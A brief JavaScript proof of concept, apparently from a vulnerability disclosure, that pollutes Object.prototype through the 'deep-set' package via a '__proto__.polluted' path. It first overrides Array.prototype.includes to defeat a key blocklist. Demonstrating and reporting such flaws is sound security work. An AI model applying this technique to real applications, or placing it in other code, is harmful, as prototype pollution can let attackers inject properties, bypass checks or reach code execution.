Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const deepSet = require('deep-set');
const obj = { 1: '2' };
deepSet(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);